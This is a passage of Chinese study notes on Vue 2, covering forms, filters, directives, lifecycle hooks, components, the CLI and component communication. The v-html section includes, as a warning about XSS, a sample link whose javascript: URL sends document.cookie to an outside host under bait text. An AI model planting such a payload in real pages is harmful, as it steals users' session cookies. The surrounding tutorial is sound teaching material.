					this.$set(this.student.hobby,0,'开车')
				},
				removeSmoke(){
					this.student.hobby = this.student.hobby.filter((h)=>{
						return h !== '抽烟'
					})
				}
			}
		})
	</script>
</html>
```

## **1.15. 收集表单数据**

### 1.15.1. 例子

<img src="https://raw.githubusercontent.com/dafansu/Note/main/Typora/Vue/img/202308041518021.png"/>

```html
<!DOCTYPE html>
<html lang="en">

<head>
	<meta charset="UTF-8">
	<meta name="viewport" content="width=device-width, initial-scale=1.0">
	<title>收集表单数据</title>
	<script type="text/javascript" src="../js/vue.js"></script>
</head>

<body>
	<div id="root">
		<form @submit.prevent="demo">
			账号：<input type="text" v-model.trim="userInfo.account"><br><br>
			密码：<input type="password" v-model.trim="userInfo.password"><br><br>
			年龄：<input type="number" v-model.number="userInfo.age"><br><br>
			性别：
					男<input type="radio" value="男" name="sex" v-model="userInfo.sex">
					女<input type="radio" value="女" name="sex" v-model="userInfo.sex">
					<br><br>
			爱好：
				吃饭<input type="checkbox" value="吃饭" v-model="userInfo.hobby">
				打游戏<input type="checkbox" value="打游戏" v-model="userInfo.hobby">
				学习<input type="checkbox" value="学习" v-model="userInfo.hobby">
				<br><br>
			城市：
				<select v-model="userInfo.city">
					<option value="">请选择校区</option>
					<option value="北京">北京</option>
					<option value="深圳">深圳</option>
					<option value="上海">上海</option>
					<option value="广州">广州</option>
				</select>
				<br><br>
			其他信息：
				<textarea v-model.lazy="userInfo.other"></textarea>
				<br><br>
			<input type="checkbox" v-model="userInfo.agree">阅读并接受<a href="#">《用户协议》</a><br><br>
			<button>提交</button>
		</form>
	</div>
</body>
<script type="text/javascript">
	Vue.config.productionTip = false //阻止 vue 在启动时生成生产提示。

	new Vue({
		el: '#root',
		data: {
			userInfo:{
				account:'',
				password:"",
				age:"",
				sex:"男",
				hobby:[],
				city:'',
				other:'',
				agree:''
			}	
		},
		methods: {
			demo(){
				console.log(JSON.stringify(this.userInfo))
			}
		},
	})
</script>
</html>
```



### 1.15.2. 总结

1. `<input type="text"/>`，则v-model收集的是value值，用户输入的就是value值。
2. `<input type="radio"/>`，则v-model收集的是value值，且要给标签配置value值。
3. `<input type="checkbox"/>`
   - **没有**配置input的**value属性**，那么收集的就是checked（勾选 or 未勾选，**是布尔值**）
   - 配置input的value属性:
     1. v-model的**初始值是非数组**，那么收集的就是checked（勾选 or 未勾选，**是布尔值**）
     2. v-model的**初始值是数组**，那么收集的的就是**value组成的数组**
4. v-model的三个修饰符：
   - **lazy**：失去焦点再收集数据
   - **number**：输入字符串转为有效的数字
   - **trim**：输入首尾空格过滤



## **1.16. 过滤器**

### 1.16.1 例子

<img src="https://raw.githubusercontent.com/dafansu/Note/main/Typora/Vue/img/202308041552833.png"/>

```html
<!DOCTYPE html>
<html>
	<head>
		<meta charset="UTF-8" />
		<title>过滤器</title>
		<script type="text/javascript" src="../js/vue.js"></script>
		<script type="text/javascript" src="../js/dayjs.min.js"></script>
	</head>
	<body>
		<div id="root">
			<h2>显示格式化后的时间</h2>
			<!-- 计算属性实现 -->
			<h3>现在是：{{fmtTime}}</h3>
			<!-- methods实现 -->
			<h3>现在是：{{getFmtTime()}}</h3>
			<!-- 过滤器实现 -->
			<h3>现在是：{{time | timeFormater}}</h3>
			<!-- 过滤器实现（传参） -->
			<h3>现在是：{{time | timeFormater('YYYY_MM_DD') | mySlice}}</h3>
			<h3 :x="msg | mySlice">尚硅谷</h3>
		</div>

		<div id="root2">
			<h2>{{msg | mySlice}}</h2>
		</div>
	</body>

	<script type="text/javascript">
		Vue.config.productionTip = false
		//全局过滤器
		Vue.filter('mySlice',function(value){
			return value.slice(0,4)
		})
		new Vue({
			el:'#root',
			data:{
				time:new Date(), //时间戳
				msg:'你好，尚硅谷'
			},
			computed: {
				fmtTime(){
					return dayjs(this.time).format('YYYY年MM月DD日 HH:mm:ss')
				}
			},
			methods: {
				getFmtTime(){
					return dayjs(this.time).format('YYYY年MM月DD日 HH:mm:ss')
				}
			},
			//局部过滤器
			filters:{
				timeFormater(value,str='YYYY年MM月DD日 HH:mm:ss'){
					return dayjs(value).format(str)
				}
			}
		})
		new Vue({
			el:'#root2',
			data:{
				msg:'hello,atguigu!'
			}
		})
	</script>
</html>
```



### **1.16.2. 理解过滤器**

- 定义：对要显示的数据进行特定格式化后再显示（适用于一些简单逻辑的处理）。
- 语法：
  1. 注册过滤器：`Vue.filter(name,callback)` 或 `new Vue{filters:{}}`
  2. 使用过滤器：`{{ xxx | 过滤器名}}`  或  `v-bind:属性 = "xxx | 过滤器名"`
- 注意：
  1. 过滤器也可以**接收额外参数**、**多个过滤器也可以串联**
  2. 并**没有改变原本的数据**, 是产生新的对应的数据

## 1.17. **内置指令**

### 1.17.1. v-text

1. 作用：向其所在的节点中渲染文本内容。
2. 与插值语法的区别：v-text会替换掉节点中的内容，{{xx}}则不会。

```html
<!DOCTYPE html>
<html>
	<head>
		<meta charset="UTF-8" />
		<title>v-text指令</title>
		<!-- 引入Vue -->
		<script type="text/javascript" src="../js/vue.js"></script>
	</head>
	<body>
		<!-- 准备好一个容器-->
		<div id="root">
			<div>你好，{{name}}</div>
			<div v-text="name"></div>
			<div v-text="str"></div>
		</div>
	</body>
	<script type="text/javascript">
		Vue.config.productionTip = false //阻止 vue 在启动时生成生产提示。
		new Vue({
			el:'#root',
			data:{
				name:'尚硅谷',
				str:'<h3>你好啊！</h3>'
			}
		})
	</script>
</html>
```



### 1.17.2. v-html

1. 作用：向指定节点中渲染包含html结构的内容。
2. 与插值语法的区别：
   - v-html会**替换掉节点中所有的内容**，{{xx}}则不会。
   - v-html可以**识别html结构**。
3. 严重注意：**v-html有安全性问题**！！！！
   - 在网站上动态渲染任意HTML是非常危险的，容易导致XSS攻击。
   - 一定要在可信的内容上使用v-html，永不要用在用户提交的内容上！

```html
<!DOCTYPE html>
<html>
	<head>
		<meta charset="UTF-8" />
		<title>v-html指令</title>
		<!-- 引入Vue -->
		<script type="text/javascript" src="../js/vue.js"></script>
	</head>
	<body>
		<!-- 准备好一个容器-->
		<div id="root">
			<div>你好，{{name}}</div>
			<div v-html="str"></div>
			<div v-html="str2"></div>
		</div>
	</body>
	<script type="text/javascript">
		Vue.config.productionTip = false //阻止 vue 在启动时生成生产提示。
		new Vue({
			el:'#root',
			data:{
				name:'尚硅谷',
				str:'<h3>你好啊！</h3>',
				str2:'<a href=javascript:location.href="http://www.baidu.com?"+document.cookie>兄弟我找到你想要的资源了，快来！</a>',
			}
		})
	</script>
</html>
```



### 1.17.3. v-cloak

1. v-cloak指令（**没有值**）
2. 本质是一个特殊属性，Vue实例**创建完毕并接管容器后**，会**删掉v-cloak属性**
3. **使用css配合v-cloak**可以解决网速慢时页面展示出{{xxx}}的问题

```html
<!DOCTYPE html>
<html>
	<head>
		<meta charset="UTF-8" />
		<title>v-cloak指令</title>
		<style>
			[v-cloak]{
				display:none;
			}
		</style>
		<!-- 引入Vue -->
	</head>
	<body>
		<!-- 准备好一个容器-->
		<div id="root">
			<h2 v-cloak>{{name}}</h2>
		</div>
        <!-- 5s后引入该js-->
		<script type="text/javascript" src="http://localhost:8080/resource/5s/vue.js"></script>
	</body>
	<script type="text/javascript">
		console.log(1)
		Vue.config.productionTip = false //阻止 vue 在启动时生成生产提示。
		
		new Vue({
			el:'#root',
			data:{
				name:'尚硅谷'
			}
		})
	</script>
</html>
```



### 1.17.4. v-once

1. v-once指令（**没有值**）
2. v-once所在节点在初次动态渲染后，就视为**静态内容**了
3. 以后**数据的改变不会引起v-once所在结构的更新**，可以用于优化性能

```html
<!DOCTYPE html>
<html>
	<head>
		<meta charset="UTF-8" />
		<title>v-once指令</title>
		<!-- 引入Vue -->
		<script type="text/javascript" src="../js/vue.js"></script>
	</head>
	<body>
		<!-- 准备好一个容器-->
		<div id="root">
			<h2 v-once>初始化的n值是:{{n}}</h2>
			<h2>当前的n值是:{{n}}</h2>
			<button @click="n++">点我n+1</button>
		</div>
	</body>
	<script type="text/javascript">
		Vue.config.productionTip = false //阻止 vue 在启动时生成生产提示。
		
		new Vue({
			el:'#root',
			data:{
				n:1
			}
		})
	</script>
</html>
```



### 1.17.5. v-pre

1. v-pre指令（**没有值**）
2. **跳过**其所在节点的**编译过程**
3. 可利用它跳过：**没有使用指令语法、没有使用插值语法的节点，会加快编译**

```html
<!DOCTYPE html>
<html>
	<head>
		<meta charset="UTF-8" />
		<title>v-pre指令</title>
		<!-- 引入Vue -->
		<script type="text/javascript" src="../js/vue.js"></script>
	</head>
	<body>
		<!-- 准备好一个容器-->
		<div id="root">
			<h2 v-pre>Vue其实很简单</h2>
			<h2 >当前的n值是:{{n}}</h2>
			<button @click="n++">点我n+1</button>
		</div>
	</body>
	<script type="text/javascript">
		Vue.config.productionTip = false //阻止 vue 在启动时生成生产提示。

		new Vue({
			el:'#root',
			data:{
				n:1
			}
		})
	</script>
</html>
```



### 1.17.6. 常用内置指令

1. `v-text` : 更新元素的 textContent
2. `v-html` : 更新元素的 innerHTML
3. `v-if` : 如果为 true, 当前标签才会输出到页面
4. `v-else`: 如果为 false, 当前标签才会输出到页面
5. `v-show` : 通过控制 display 样式来控制显示/隐藏
6. `v-for` : 遍历数组/对象
7. `v-on` : 绑定事件监听, 一般简写为@
8. `v-bind` : 绑定解析表达式, 可以省略 v-bind
9. `v-model` : 双向数据绑定
10. `v-cloak` : 防止闪现, 与 css 配合: [v-cloak] { display: none }



## 1.18. 自定义指令

### 1.18.1. 例子

```html
<!DOCTYPE html>
<html>
	<head>
		<meta charset="UTF-8" />
		<title>自定义指令</title>
		<script type="text/javascript" src="../js/vue.js"></script>
	</head>
	<body>
		<!-- 
				需求1：定义一个v-big指令，和v-text功能类似，但会把绑定的数值放大10倍。
				需求2：定义一个v-fbind指令，和v-bind功能类似，但可以让其所绑定的input元素默认获取焦点。
		<!-- 准备好一个容器-->
		<div id="root">
			<h2>{{name}}</h2>
			<h2>当前的n值是：<span v-text="n"></span> </h2>
			<!-- <h2>放大10倍后的n值是：<span v-big-number="n"></span> </h2> -->
			<h2>放大10倍后的n值是：<span v-big="n"></span> </h2>
			<button @click="n++">点我n+1</button>
			<hr/>
			<input type="text" v-fbind:value="n">
		</div>
	</body>
	
	<script type="text/javascript">
		Vue.config.productionTip = false

		//定义全局指令
		/* Vue.directive('fbind',{
			//指令与元素成功绑定时（一上来）
			bind(element,binding){
				element.value = binding.value
			},
			//指令所在元素被插入页面时
			inserted(element,binding){
				element.focus()
			},
			//指令所在的模板被重新解析时
			update(element,binding){
				element.value = binding.value
			}
		}) */

		new Vue({
			el:'#root',
			data:{
				name:'尚硅谷',
				n:1
			},
			directives:{
				//big函数何时会被调用？1.指令与元素成功绑定时（一上来）。2.指令所在的模板被重新解析时。
				/* 'big-number'(element,binding){
					// console.log('big')
					element.innerText = binding.value * 10
				}, */
				big(element,binding){
					console.log('big',this) //注意此处的this是window
					// console.log('big')
					element.innerText = binding.value * 10
				},
				fbind:{
					//指令与元素成功绑定时（一上来）
					bind(element,binding){
						element.value = binding.value
					},
					//指令所在元素被插入页面时
					inserted(element,binding){
						element.focus()
					},
					//指令所在的模板被重新解析时
					update(element,binding){
						element.value = binding.value
					}
				}
			}
		})
		
	</script>
</html>
```



### 1.18.2. **局部指令**

1. 函数式

   ```js
   directives:{
       big(element,binding){
           console.log('big',this) //注意此处的this是window
           // console.log('big')
           element.innerText = binding.value * 10
       },
   }
   ```

2. 对象式

   ```js
   directives:{
       fbind:{
           //指令与元素成功绑定时（一上来）
           bind(element,binding){
               element.value = binding.value
           },
           //指令所在元素被插入页面时
           inserted(element,binding){
               element.focus()
           },
           //指令所在的模板被重新解析时
            update(element,binding){
                element.value = binding.value
            }
       }
   }
   ```

   

### 1.18.3. 全局指令

1. 函数式

   ```js
   Vue.directive('big',function(element, binding){
       console.log('big',this) //注意此处的this是window
       element.innerText = binding.value * 10
   })
   ```

2. 对象式

   ```js
   Vue.directive('fbind',{
       //指令与元素成功绑定时（一上来）
       bind(element,binding){
           element.value = binding.value
       },
       //指令所在元素被插入页面时
       inserted(element,binding){
           element.focus()
       },
       //指令所在的模板被重新解析时
       update(element,binding){
           element.value = binding.value
       }
   })
   ```

   

### 1.18.4 总结

1. 配置对象式中常用的3个回调：
   - `bind`：指令与元素成功**绑定**时调用。
   - `inserted`：指令所在元素被**插入**页面时调用。
   - `update`：指令所在模板结构**被重新解析**时调用。
2. 注意：
   - **指令定义时不加v-，但使用时要加v-**；
   - 指令名如果是多个单词，要使用**kebab-case**命名方式，不要用camelCase命名。

> <span style="color:red;font-weight:bolder">kebab-case命名： </span>要求短语内的各个单词或缩写之间以`-`（连字符）做间隔。
>
> <span style="color:red;font-weight:bolder">camelCase命名：</span>驼峰式命名



## 1.19. 生命周期

### **1.19.1. 生命周期流程图**

<img src="https://raw.githubusercontent.com/dafansu/Note/main/Typora/Vue/img/202308171551958.png"/>



### 1.19.2. 例子

<img src="https://raw.githubusercontent.com/dafansu/Note/main/Typora/Vue/img/202308172237335.png"/>

```html
<!DOCTYPE html>
<html>
	<head>
		<meta charset="UTF-8" />
		<title>分析生命周期</title>
		<!-- 引入Vue -->
		<script type="text/javascript" src="../js/vue.js"></script>
	</head>
	<body>
		<!-- 准备好一个容器-->
		<div id="root" :x="n">
			<h2 v-text="n"></h2>
			<h2>当前的n值是：{{n}}</h2>
			<button @click="add">点我n+1</button>
			<button @click="bye">点我销毁vm</button>
		</div>
	</body>

	<script type="text/javascript">
		Vue.config.productionTip = false //阻止 vue 在启动时生成生产提示。

		new Vue({
			el:'#root',
			// template:`
			// 	<div>
			// 		<h2>当前的n值是：{{n}}</h2>
			// 		<button @click="add">点我n+1</button>
			// 	</div>
			// `,
			data:{
				n:1
			},
			methods: {
				add(){
					console.log('add')
					this.n++
				},
				bye(){
					console.log('bye')
					this.$destroy()
				}
			},
			watch:{
				n(){
					console.log('n变了')
				}
			},
			beforeCreate() {
				console.log('beforeCreate')
			},
			created() {
				console.log('created')
			},
			beforeMount() {
				console.log('beforeMount')
			},
			mounted() {
				console.log('mounted')
			},
			beforeUpdate() {
				console.log('beforeUpdate')
			},
			updated() {
				console.log('updated')
			},
			beforeDestroy() {
				console.log('beforeDestroy')
			},
			destroyed() {
				console.log('destroyed')
			},
		})
	</script>
</html>
```



### 1.19.3. **常用的生命周期钩子**

1. **mounted**: 发送ajax请求、启动定时器、绑定自定义事件、订阅消息等【初始化操作】
2. **beforeDestroy:** 清除定时器、解绑自定义事件、取消订阅消息等【收尾工作】



### 1.19.4. 关于销毁Vue实例

1. 销毁后借助Vue开发者工具看不到任何信息
2. 销毁后**自定义事件**会**失效**，但**原生DOM事件依然有效**
3. 一般不会在beforeDestroy操作数据，因为即便操作数据，也不会再触发更新流程了



# **第 2 章：Vue 组件化编程**

## **2.1 模块与组件、模块化与组件化**

### **2.1.1. 模块**

1. 理解 ==> 向外提供特定功能的 js 程序, 一般就是一个 js 文件
2. 为什么 ==> js 文件很多很复杂
3. 作用 ==> 复用 js, 简化 js 的编写, 提高 js 运行效率



### **2.1.2. 组件**

1. 理解 ==> 用来实现局部(特定)功能效果的代码集合(html/css/js/image…..)
2. 为什么 ==> 一个界面的功能很复杂
3. 作用 ==> 复用编码, 简化项目编码, 提高运行效率



### **2.1.3. 模块化**

当应用中的 js 都以模块来编写的, 那这个应用就是一个模块化的应用。



### **2.1.4. 组件化**

当应用中的功能都是多组件的方式来编写的, 那这个应用就是一个组件化的应用

<img src="https://raw.githubusercontent.com/dafansu/Note/main/Typora/Vue/img/202308180054314.png"/>

<img src="https://raw.githubusercontent.com/dafansu/Note/main/Typora/Vue/img/202308180050403.png"/>



## 2.2. 非单文件组件

**非单文件组件:一个文件中包含n个组件。**



### 2.2.1. 例子

<img src="https://raw.githubusercontent.com/dafansu/Note/main/Typora/Vue/img/202308182301460.png"/>

```html
<!DOCTYPE html>
<html>
	<head>
		<meta charset="UTF-8" />
		<title>基本使用</title>
		<script type="text/javascript" src="../js/vue.js"></script>
	</head>
	<body>
		<!-- 准备好一个容器-->
		<div id="root">
			<hello></hello>
			<hr>
			<h1>{{msg}}</h1>
			<hr>
			<!-- 第三步：编写组件标签 -->
			<school></school>
			<hr>
			<!-- 第三步：编写组件标签 -->
			<student></student>
		</div>

		<div id="root2">
			<hello></hello>
		</div>
	</body>

	<script type="text/javascript">
		Vue.config.productionTip = false

		//第一步：创建school组件
		const school = Vue.extend({
			template:`
				<div class="demo">
					<h2>学校名称：{{schoolName}}</h2>
					<h2>学校地址：{{address}}</h2>
					<button @click="showName">点我提示学校名</button>	
				</div>
			`,
			// el:'#root', 
            //组件定义时，一定不要写el配置项，因为最终所有的组件都要被一个vm管理，由vm决定服务于哪个容器。
			data(){
				return {
					schoolName:'尚硅谷',
					address:'北京昌平'
				}
			},
			methods: {
				showName(){
					alert(this.schoolName)
				}
			},
		})

		//第一步：创建student组件
		const student = Vue.extend({
			template:`
				<div>
					<h2>学生姓名：{{studentName}}</h2>
					<h2>学生年龄：{{age}}</h2>
				</div>
			`,
			data(){
				return {
					studentName:'张三',
					age:18
				}
			}
		})
		
		//第一步：创建hello组件
		const hello = Vue.extend({
			template:`
				<div>	
					<h2>你好啊！{{name}}</h2>
				</div>
			`,
			data(){
				return {
					name:'Tom'
				}
			}
		})
		
		//第二步：全局注册组件
		Vue.component('hello',hello)

		//创建vm
		new Vue({
			el:'#root',
			data:{
				msg:'你好啊！'
			},
			//第二步：注册组件（局部注册）
			components:{
				school:school,
				student:student
			}
		})

		new Vue({
			el:'#root2',
		})
	</script>
</html>
```



### 2.2.2. Vue中使用组件的三大步骤

#### 1. 定义组件(创建组件)

使用`Vue.extend(options)`创建，其中options和new Vue(options)时传入的那个options几乎一样,但也有点区别；

区别如下：

1. el不要写，为什么？ ——— 最终所有的组件都要经过一个vm的管理，由vm中的el决定服务哪个容器。

2. data必须写成函数，为什么？ ———— 避免组件被复用时，数据存在引用关系。

3. 备注：使用template可以配置组件结构。

   

#### 2. 注册组件

1. 局部注册：靠new Vue的时候传入`components`选项
2. 全局注册：靠`Vue.component('组件名',组件)`

​      

#### 3. 编写组件标签

`<school></school>`



### 2.2.3. 弊端

1. 模板编写没有提示
2. 没有构建过程, 无法将 ES6 转换成 ES5
3. 不支持组件的 CSS
4. 真正开发中几乎不用



## 2.3. 组件的几个注意点

### 2.3.1. 关于组件名

- 一个单词组成：
  1. 第一种写法(**首字母小写**)：school
  2. 第二种写法(**首字母大写**)：School
- 多个单词组成：
  1. 第一种写法(**kebab-case命名**)：my-school
  2. 第二种写法(**CamelCase命名**)：MySchool (**需要Vue脚手架支持**)
- 备注：
  1. 组件名尽可能**回避HTML中已有的元素名称**，例如：h2、H2都不行
  2. 可以使用**name配置项指定组件在开发者工具中呈现的名字**



### 2.3.2. 关于组件标签

- 第一种写法：`<school></school>`
- 第二种写法：`<school/>`
- 备注：**不用使用脚手架时，`<school/>`会导致后续组件不能渲染**。



### 2.3.3. 简写方式

`const school = Vue.extend(options)` 可简写为：`const school = options`



## 2.4. VueComponent

1. school组件本质是一个<span style="color:red;font-weight:bolder">名为VueComponent的构造函数</span>，且不是程序员定义的，<span style="color:red;font-weight:bolder">是Vue.extend生成的</span>

2. 我们只需要写`<school/>`或`<school></school>`，Vue解析时会帮我们创建school组件的实例对象，即Vue帮我们执行的：`new VueComponent(options)`

3. 特别注意：<span style="color:red;font-weight:bolder">每次调用Vue.extend，返回的都是一个全新的VueComponent！！！！</span>

4. 关于this指向：

   - **组件**配置中：data函数、methods中的函数、watch中的函数、computed中的函数 它们的this均是**【VueComponent实例对象】**
   - **new Vue(options)**配置中：data函数、methods中的函数、watch中的函数、computed中的函数 它们的this均是**【Vue实例对象】**

5. VueComponent的实例对象，以后简称vc（也可称之为：组件实例对象）

6. Vue的实例对象，以后简称vm。

   

## 2.5. 一个重要的内置关系

`VueComponent.prototype.__proto__ === Vue.prototype`

为什么要有这个关系：让组件实例对象（vc）可以访问到 Vue原型上的属性、方法。

<img src="https://raw.githubusercontent.com/dafansu/Note/main/Typora/Vue/img/202309051832953.png"/>



## 2.6. 单文件组件

**单文件组件: 一个文件中只包含1个组件。**



### 2.6.1 **一个.vue 文件的组成(3 个部分)**

1. 模板页面

   ```vue
   <template>
   页面模板
   </template>
   ```

   

2. JS 模块对象

   ```vue
   <script>
       export default {
       data() {return {}}, methods: {}, computed: {}, components: {}
       }
   </script>
   ```

   

3. 样式

   ```vue
   <style>
   	样式定义
   </style>
   ```

   

### 2.6.2. 基本使用

1. 引入组件
2. 映射成标签
3. 使用组件标签



# 第3章：**使用** **Vue** **脚手架**

## 3.1. 初始化脚手架

### 3.1.1. 具体步骤

1. **全局安装@vue/cli。（仅第一次执行）（需要安装配置nodejs）**

   `npm install -g @vue/cli`

2. **切换到你要创建项目的目录，然后使用命令创建项目**

   `vue create xxxx`

3. **启动项目**

   `npm run serve`

**备注：**

```txt
1. 如出现下载缓慢请配置 npm 淘宝镜像：npm config set registry https://registry.npm.taobao.org

2. Vue 脚手架隐藏了所有 webpack 相关的配置，若想查看具体的 webpakc 配置，
请执行：vue inspect > output.js
```



### 3.1.2. **模板项目的结构**

```txt
├── node_modules 
├── public
│   ├── favicon.ico: 页签图标
│   └── index.html: 主页面
├── src
│   ├── assets: 存放静态资源
│   │   └── logo.png
│   │── component: 存放组件
│   │   └── HelloWorld.vue
│   │── App.vue: 汇总所有组件
│   │── main.js: 入口文件
├── .gitignore: git版本管制忽略的配置
├── babel.config.js: babel的配置文件
├── package.json: 应用包配置文件 
├── README.md: 应用描述文件
├── package-lock.json：包版本控制文件
```



## 3.2. 关于不同版本的Vue

1. vue.js与vue.runtime.xxx.js的区别：
   - vue.js是完整版的Vue，包含：核心功能 + 模板解析器。
   - vue.runtime.xxx.js是运行版的Vue，只包含：核心功能；没有模板解析器。
2. 因为vue.runtime.xxx.js没有模板解析器，所以不能使用template这个配置项，需要使用render函数接收到的createElement函数去指定具体内容。



## 3.3. vue.config.js配置文件

1. 使用`vue inspect > output.js`可以查看到Vue脚手架的默认配置。
2. 使用vue.config.js可以对脚手架进行个性化定制，详情见：https://cli.vuejs.org/zh



## 3.4. ref属性

1. 被用来给**元素或子组件**注册引用信息（id的替代者）
2. 应用在**html标签**上获取的是**真实DOM元素**，应用在**组件标签**上是**组件实例对象**（vc）
3. 使用方式：
   - 标识：`<h1 ref="xxx">.....</h1>` 或 `<School ref="xxx"></School>`
   - 获取：`this.$refs.xxx`



**例子**

```vue
<template>
	<div>
		<h1 v-text="msg" ref="title"></h1>
		<button @click="showDOM" ref="btn">点击输出上方的DOM</button>
		<MySchool ref='school'></MySchool>
	</div>
</template>

<script>
import MySchool from "./components/MySchool.vue"

export default {
	name: "App",
	components:{MySchool},
	data() {
		return {
			msg:'欢迎学习Vue'
		}
	},
	methods: {
		showDOM(){
			console.log(this.$refs);
		}
	}
	
}
</script>
```

<img src="https://raw.githubusercontent.com/dafansu/Note/main/Typora/Vue/img/202309061819443.png"/>



## 3.5. props配置项

1. 功能：让**组件接收外部**传过来的数据

2. 传递数据：`<Demo name="xxx"/>`

3. 接收数据：

   - 第一种方式（只接收）：``props:['name'] `

   - 第二种方式（限制类型）：`props:{name:String}`

   - 第三种方式（限制类型、限制必要性、指定默认值）：

     ```vue
     props:{
     	name:{
     	type:String, //类型
     	required:true, //必要性
     	default:'老王' //默认值
     	}
     }
     ```

> 备注：<span style="color:red;font-weight:bolder">props是只读的</span>，Vue底层会监测你对props的修改，<span style="color:red;font-weight:bolder">如果进行了修改，就会发出警告</span>，若业务需求确实需要修改，那么请<span style="color:red;font-weight:bolder">复制props的内容到data中一份，然后去修改data中的数据。</span>



## 3.6. mixin配置项(混入)

1. 功能：可以把**多个组件共用的配置**提取成一个混入对象

2. 使用方式：

   第一步定义混合：

   ```js
   //文件名 mixin.js
   export const xxx ={
       data(){....},
       methods:{....}
       ....
   }
   ```

   第二步导入混合：

   ```js
   import {xxx} from "./mixin"
   ```

   第三步使用混入：

   全局混入：`Vue.mixin(xxx)`

   局部混入：`mixins:[xxx]	`



## 3.7. plugins插件

1. 用于增强Vue

2. 本质：**包含install方法的一个对象，install的第一个参数是Vue**，第二个以后的参数是**插件使用者传递的数据**。

3. 定义插件：

   ```js
   const xxx = {
   	install(Vue, options){
           // 1. 添加全局过滤器
           Vue.filter(....)
   
           // 2. 添加全局指令
           Vue.directive(....)
   
           // 3. 配置全局混入(合)
           Vue.mixin(....)
   
           // 4. 添加实例方法
           Vue.prototype.$myMethod = function () {...}
           
           Vue.prototype.hello = xxx
   	}
   }
   ```

4. 使用插件：`Vue.use(xxx)`



## 3.8. scoped样式

1. 作用：**让样式在局部生效，防止冲突**。
2. 写法：`<style scoped></style>`

> 备注：App组件不建议加scoped



## 3.9. 总结TodoList案例

1. 组件化编码流程：

   ​	(1).拆分静态组件：**组件要按照功能点拆分**，命名不要与html元素冲突。

   ​	(2).实现动态组件：考虑好数据的存放位置，数据是一个组件在用，还是一些组件在用：

   ​			1).一个组件在用：放在组件自身即可。

   ​			2). 一些组件在用：放在他们共同的父组件上（<span style="color:red">状态提升</span>）。

   ​	(3).实现交互：从绑定事件开始。

2. props适用于：

   ​	(1).父组件 ==> 子组件 通信

   ​	(2).子组件 ==> 父组件 通信（要求父先给子一个函数）

3. 使用v-model时要切记：v-model绑定的值不能是props传过来的值，因为**props是不可以修改的**！

4. **props传过来的若是对象类型的值，修改对象中的属性时Vue不会报错，但不推荐这样做。**



## 3.10. webStorage浏览器本地存储

1. 存储内容大小一般支持5MB左右（不同浏览器可能还不一样）

2. 浏览器端通过 Window.sessionStorage 和 Window.localStorage 属性来实现本地存储机制。

3. 相关API：

   - `xxxxxStorage.setItem('key', 'value');`
     	该方法接受一个键和值作为参数，会把键值对添加到存储中，如果键名存在，则更新其对应的值。

   - `xxxxxStorage.getItem('person');`

     ​		该方法接受一个键名作为参数，返回键名对应的值。

   - `xxxxxStorage.removeItem('key');`

     ​		该方法接受一个键名作为参数，并把该键名从存储中删除。

   - `xxxxxStorage.clear()`

     ​		该方法会清空存储中的所有数据。

4. 备注：

   - SessionStorage存储的内容会**随着浏览器窗口关闭而消失**。
   - LocalStorage存储的内容，**需要手动清除才会消失**。
   - `xxxxxStorage.getItem(xxx)`如果xxx对应的**value获取不到**，那么getItem的返回值是**null**。
   - `JSON.parse(null)`的结果依然是null。



## 3.11. 组件的自定义事件

1. 一种组件间通信的方式，适用于：<strong style="color:red">子组件 ===> 父组件</strong>

2. 使用场景：A是父组件，B是子组件，B想给A传数据，那么就要在A中给B绑定自定义事件（<span style="color:red">事件的回调在A中</span>）。

3. 绑定自定义事件：

   1. 第一种方式，在父组件中：```<Demo @atguigu="test"/>```  或 ```<Demo v-on:atguigu="test"/>```

   2. 第二种方式，在父组件中：

      ```js
      <Demo ref="demo"/>
      ......
      mounted(){
         this.$refs.xxx.$on('atguigu',this.test)
      }
      ```

   3. 若想让自定义事件只能触发一次，可以使用```once```修饰符，或```$once```方法。

4. 触发自定义事件：```this.$emit('atguigu',数据)```		

5. 解绑自定义事件```this.$off('atguigu')```

6. 组件上也可以绑定原生DOM事件，需要使用```native```修饰符。

7. 注意：通过```this.$refs.xxx.$on('atguigu',回调)```绑定自定义事件时，回调<span style="color:red">要么配置在methods中</span>，<span style="color:red">要么用箭头函数</span>，否则this指向会出问题！



## 3.12. 全局事件总线（GlobalEventBus）

1. 一种组件间通信的方式，适用于<span style="color:red">任意组件间通信</span>。

2. 安装全局事件总线：

   ```js
   //main.js（创建vm的文件）（入口文件）
   new Vue({
   	......
   	beforeCreate() {
   		Vue.prototype.$bus = this //安装全局事件总线，$bus就是当前应用的vm
   	},
       ......
   }) 
   ```

3. 使用事件总线：

   1. 接收数据：A组件想接收数据，则在A组件中给$bus绑定自定义事件，事件的<span style="color:red">回调留在A组件自身。</span>

      ```js
      methods(){
        demo(data){......}
      }
      ......
      mounted() {
        this.$bus.$on('xxxx',this.demo)
      }
      ```

   2. 提供数据：`this.$bus.$emit('xxxx',数据)`

      B组件给A组件，在methods中的方法调用

      ```js
      methods:{
          sendStudentName(){
          	this.$bus.$emit("xxx", this.name)
          }
      }
      ```

4. 最好在beforeDestroy钩子中，用$off去解绑<span style="color:red">当前组件所用到的</span>事件。

   ```js
   beforeDestroy(){
       this.$bus.$off("xxxx")
   }
   ```

<img src="https://raw.githubusercontent.com/dafansu/Note/main/Typora/Vue/img/202309112330693.png"/>

## 3.13. 消息订阅与发布（pubsub）

1.   一种组件间通信的方式，适用于<span style="color:red">任意组件间通信</span>。

2. 使用步骤：

   1. 安装pubsub：```npm i pubsub-js```

   2. 引入: ```import pubsub from 'pubsub-js'```

   3. 接收数据：A组件想接收数据，则在A组件中订阅消息，订阅的<span style="color:red">回调留在A组件自身。</span>

      ```js
      methods(){
        demo(data){......}
      }
      ......
      mounted() {
        this.pid = pubsub.subscribe('xxx',this.demo) //订阅消息
      }
      ```

   4. 提供数据：`pubsub.publish('xxx',数据)`

      B组件发送数据，则在B组件中发布消息

      ```js
      methods:{
          sendStudentName(){
              pubsub.publish("xxx",data)
          }
      }
      ```

   5. 最好在beforeDestroy钩子中，用```PubSub.unsubscribe(pid)```去<span style="color:red">取消订阅。</span>

      ```js
      beforeDestroy(){
      	pubsub.unsubscribe(this.pid)
      }
      ```




## 3.14. $nextTick

1. 语法：```this.$nextTick(回调函数)```
2. 作用：**在下一次 DOM 更新结束**后执行其指定的回调。
3. 什么时候用：当改变数据后，要基于更新后的新DOM进行某些操作时，要在nextTick所指定的回调函数中执行。



## 3.15. Vue封装的过度与动画

1. 作用：在插入、更新或移除 DOM元素时，在合适的时候给元素添加样式类名。

2. 图示：

   <img src="https://raw.githubusercontent.com/dafansu/Note/main/Typora/Vue/img/202309132341237.png"/>

3. 写法：

